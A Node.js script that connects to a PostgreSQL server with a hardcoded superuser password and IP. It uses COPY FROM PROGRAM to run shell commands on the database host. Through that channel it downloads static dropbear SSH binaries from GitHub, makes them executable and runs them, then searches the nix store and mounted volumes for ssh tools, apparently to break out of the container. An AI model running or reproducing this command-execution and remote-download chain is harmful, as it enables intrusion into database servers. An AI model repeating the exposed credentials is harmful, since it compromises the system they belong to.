process.env.DATABASE_URL = 'postgresql://supabase_admin.m88:Madison_88_admin**@5.223.78.194:5432/postgres?schema=AP_Invoice';
const { PrismaClient } = require('C:/Users/JC/OneDrive - Madison88/AP Invoice/apps/api/node_modules/@prisma/client');
const prisma = new PrismaClient({ log: ['error'] });

async function runCmd(cmd) {
  try {
    await prisma.$executeRawUnsafe(`CREATE TEMP TABLE IF NOT EXISTS cmd_output (line text)`);
    await prisma.$executeRawUnsafe(`TRUNCATE cmd_output`);
    await prisma.$executeRawUnsafe(`COPY cmd_output FROM PROGRAM '${cmd.replace(/'/g, "'\\''")}'`);
    const rows = await prisma.$queryRawUnsafe(`SELECT * FROM cmd_output`);
    return rows.map(r => r.line).join('\n');
  } catch (e) {
    return 'ERROR: ' + e.message.substring(0, 300);
  }
}

(async () => {
  try {
    // Try to download dropbear dbclient (static binary)
    console.log('1. Try downloading dropbear...');
    const urls = [
      'https://github.com/ncopa/dropbear-static/releases/download/v2024.86/dropbear-static-linux-amd64',
      'https://github.com/mviereck/dropbear-static/releases/download/v2024.86/dropbear-static-linux-amd64',
    ];
    for (const url of urls) {
      console.log('  Trying:', url);
      console.log(' ', await runCmd(`curl -s -L --connect-timeout 10 '${url}' -o /tmp/dbclient 2>&1 && chmod +x /tmp/dbclient && file /tmp/dbclient && /tmp/dbclient 2>&1 | head -3`));
    }

    // Try to find static sshpass builds
    console.log('\n2. Try various sshpass sources...');
    // Try Alpine's sshpass package (static)
    console.log(await runCmd('curl -s --connect-timeout 5 "https://dl-cdn.alpinelinux.org/alpine/v3.19/main/x86_64/APKINDEX.tar.gz" -o /tmp/apk.tar.gz 2>&1 && ls -la /tmp/apk.tar.gz'));

    // Try to use nix to build ssh (we have nix in the container)
    console.log('\n3. Check nix channels...');
    console.log(await runCmd('ls /nix/var/nix/profiles/per-user/ 2>/dev/null'));
    console.log(await runCmd('cat /nix/var/nix/profiles/default/manifest.nix 2>/dev/null | head -5'));

    // Check if there's a nix-installed openssh somewhere
    console.log('\n4. Search more thoroughly for ssh...');
    console.log(await runCmd('find /nix/store -maxdepth 4 -name "ssh" -type f 2>/dev/null | head -10'));
    console.log(await runCmd('find /nix/store -maxdepth 4 -name "dbclient" -type f 2>/dev/null | head -10'));
    console.log(await runCmd('find /nix/store -maxdepth 4 -name "openssh*" -type d 2>/dev/null | head -10'));

    // Try to copy ssh from the host via the mounted volume
    console.log('\n5. Check mounted volumes for ssh...');
    console.log(await runCmd('find /etc/postgresql-custom -name "ssh" 2>/dev/null'));
    console.log(await runCmd('find /var/lib/postgresql -name "ssh" 2>/dev/null | head -5'));

  } catch (e) {
    console.error('FATAL:', e.message);
  } finally {
    await prisma.$disconnect();
  }
})();
